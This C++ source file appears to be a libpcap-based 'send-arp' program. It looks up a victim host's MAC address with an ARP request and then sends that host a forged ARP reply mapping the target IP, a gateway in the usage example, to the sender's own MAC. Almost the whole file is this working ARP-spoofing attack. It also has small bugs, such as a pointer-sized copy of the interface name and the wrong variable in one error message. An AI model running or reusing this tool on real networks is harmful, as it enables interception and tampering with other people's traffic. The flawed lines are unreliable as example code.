#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"


#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t* alldevsp;
    pcap_if_t* dev;

    if(pcap_findalldevs(&alldevsp, errbuf) == -1){
        fprintf(stderr, "pcap_findalldevs return nullptr - %s\n",errbuf);
        return -1;
    }

    for(dev = alldevsp; dev; dev=dev->next){
        printf("%s\n", dev->name);
        if(strncmp(dev->name, argv[1], strlen(dev->name))==0)
            break;
    }

    if(dev == nullptr){
        fprintf(stderr, "No matching network interface '%s'.\n", argv[1]);
        return -1;
    }



    pcap_t* handle = pcap_open_live(dev->name, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev->name, errbuf);
        return -1;
    }

    EthArpPacket packet;






    struct ifreq ifr;
    uint8_t mac[6];
    uint32_t lcip = 0;
    int s;


    s = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev->name , sizeof(dev->name)-1);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        printf("Error occured during ioctl().");
    } else {
        memcpy(mac,ifr.ifr_hwaddr.sa_data ,6 );
        printf("%s's MAC Address : %s\n", ifr.ifr_name,
               std::string((Mac)mac).c_str() );
    }

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error occured during ioctl().");
    } else {
        memcpy(&lcip,ifr.ifr_addr.sa_data+2,4);
        printf("Local IP Address : %s\n", std::string((Ip)htonl(lcip)).c_str());
    }


    close(s);



    packet.eth_.smac_ = mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.smac_ = mac;
    packet.arp_.tip_ = htonl(Ip(argv[2]));







    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.sip_ = lcip;
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    printf("\n\nARP Request Packet Sended.\n");


    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        printf("\n\n%u bytes captured\n", header->caplen);



        EthArpPacket *rcvpkt;

        rcvpkt = (struct EthArpPacket*)pkt;



        if(rcvpkt->eth_.type_ == htons(EthHdr::Arp)){
            printf("ARP packet captured.\n");
            if(rcvpkt->arp_.op_ == htons(ArpHdr::Reply)){
                printf("ARP Reply packet captured.\n");
                if(rcvpkt->arp_.sip_ == (Ip)htonl(Ip(argv[2]))) {
                    memcpy(mac, rcvpkt->arp_.smac_, 6);
                    printf("ARP Reply from target captured!\nvictim mac :%s\n",
                           std::string((Mac)mac).c_str());
                    break;

                }

            }

        }


    }




    packet.eth_.dmac_ = mac;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = htonl(Ip(argv[3]));
    packet.arp_.tmac_ = mac;


    int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res2 != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    printf("\n\nARP Spoofing Packet Sended.\n");

    pcap_close(handle);
}
